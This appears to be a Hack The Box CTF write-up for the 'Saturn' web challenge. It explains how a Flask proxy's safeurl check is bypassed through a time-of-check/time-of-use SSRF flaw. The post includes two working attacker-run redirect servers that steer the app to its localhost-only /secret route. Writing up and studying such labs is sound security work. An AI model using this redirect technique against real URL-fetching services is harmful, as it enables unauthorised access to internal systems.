---
layout: post
title:  "Saturn"
date:   2025-03-18 12:32:45 +0100
permalink: /hackthebox/saturn/
---


# HTB - Saturn
---
> Author: auk0x01
> Published: March 19, 2025
> Description: Saturn corp just launched their new proxy service. According to them, they have made sure their proxy service contains no security issues as they have implemented decent security measures with up to date components.

---

<br>


As usual, the `index` page is pretty simple, with just an input field where we can enter a URL. When we type in a URL and hit "Search," the page fetches the content and loads it inside an iframe.

Normally, when a page lets us interact with a URL like this, it could be vulnerable to SSRF. So, we tried entering a `localhost` URL—but as expected, it didn’t work. Based on the challenge description, it seems like there’s a proxy service handling the requests. Let’s take a look at the source code.

![image.png](/assets/images/saturn/image.png)

![image.png](/assets/images/saturn/image1.png)

![image.png](/assets/images/saturn/image2.png)

This is a simple Flask application with only two defined routes, and our goal is very straightforward—if we can access `/secret` with the IP `127.0.0.1`, we’ll get the flag.

The index page accepts a URL parameter and uses the `safeurl` library to validate it.

- `enableFollowLocation().setFollowLocationLimit(0)`: Disable redirect

Look over the application source code again, we can tell that our input data get processed twice.
First, it’s checked using `su.execute(url)` from the `safeurl` library. If the URL passes validation, it’s then used again with `requests.get(url)`.

This creates a [TOCTOU](https://natalieagus.github.io/50005/labs/02-toctou) (Time-of-Check to Time-of-Use) vulnerability. We can submit a valid URL to bypass the `safeurl` check, but then have it redirect to a malicious URL, tricking the application into making the request for us.

```python
from flask import Flask, request, render_template
import requests
from safeurl import safeurl

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url) #Time of check
        except:
            return render_template('index.html', error=f"Malicious input detected.")
        r = requests.get(url) # Time of use
        return render_template('index.html', result=r.text)
    return render_template('index.html')

@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        flag = ""
        with open('./flag.txt') as f:
            flag = f.readline()
        return render_template('secret.html', SECRET=flag)
    else:
        return render_template('forbidden.html'), 403

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=1337, threaded=True)

```

## ***Exploittaion***

```python
import requests
from flask import Flask, request, jsonify, redirect

app = Flask(__name__)

test = True

@app.route('/')
def index():
    global test
    if test:
        test = False
        return "Hello, World!"

    return redirect('http://localhost:1337/secret', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4433, debug=True)
```


There is another way to bypass this which is strange to me is that we can put a redirect inside a redirect. 

Here we host our own redirect via `ngrok` and shortened that URL with a service like ShortURL. This is also worked, even though the option was set to block redirects. My guess is that the request still follow the redirect but only checks if the final destination is a valid.  Anyway, both ways work. 

```python
import requests
from flask import Flask, request, jsonify, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return redirect('http://localhost:1337/secret', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4433, debug=True)
```

![image.png](/assets/images/saturn/image3.png)

![image.png](/assets/images/saturn/image4.png)

## ***I’ve Learned***

💡TOCTOU: Bypass SSRF